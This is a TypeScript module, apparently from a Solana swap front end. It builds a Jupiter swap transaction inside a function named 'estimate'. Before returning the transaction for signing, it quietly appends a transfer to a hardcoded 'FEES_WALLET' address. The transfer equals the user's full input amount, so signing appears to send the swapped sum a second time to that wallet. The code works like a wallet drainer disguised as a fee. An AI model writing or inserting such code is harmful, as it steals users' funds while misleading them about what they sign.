import { Provider } from "@web3modal/solana/react";
import { getFromValue, getToToken, setEstimationOnprogress } from "./swapper";
import JSBI from "jsbi";
import { AddressLookupTableAccount, Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } from "@solana/web3.js";

export const estimate = async (wallet: Provider,connection: Connection) => {
  setEstimationOnprogress(true)
  const SOL_MINT = "So11111111111111111111111111111111111111112";
  const FEES_WALLET = "9YcMeALSJ112pGUDUmQySPRH4Z3RHsA7EpcSjDBJ5SGX";

  const token = getToToken()

  const amount = JSBI.BigInt(getFromValue() * 1e9); // Convert input amount to lamports

  const quoteData = await (
    await fetch(
      `https://quote-api.jup.ag/v6/quote?inputMint=${SOL_MINT}&outputMint=${token.id}&amount=${amount}&slippageBps=${100}`
    )
  ).json();

  const { swapTransaction } = await (

    await fetch("https://quote-api.jup.ag/v6/swap", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        quoteResponse: quoteData,
        userPublicKey: wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
      }),
    })
  ).json();

  const transferInstruction = SystemProgram.transfer({
    fromPubkey: wallet.publicKey,
    toPubkey: new PublicKey(FEES_WALLET),
    lamports: getFromValue() * 1e9,
  });


  const swapTransactionBuf = Buffer.from(swapTransaction, "base64");
  const transaction = VersionedTransaction.deserialize(swapTransactionBuf);

  const addressLookupTableAccounts = await Promise.all(
    transaction.message.addressTableLookups.map(async (lookup: any) => {
      return new AddressLookupTableAccount({
        key: lookup.accountKey,
        state: AddressLookupTableAccount.deserialize(
          await connection
            .getAccountInfo(lookup.accountKey)
            .then((res) => res?.data)
        ),
      });
    })
  );

  /* Merge all the instructions (swap and transfer) into one array */
  const message = TransactionMessage.decompile(transaction.message, {
    addressLookupTableAccounts: addressLookupTableAccounts,
  });

  message.instructions.push(transferInstruction);
  transaction.message = message.compileToV0Message(addressLookupTableAccounts);

  return transaction
}
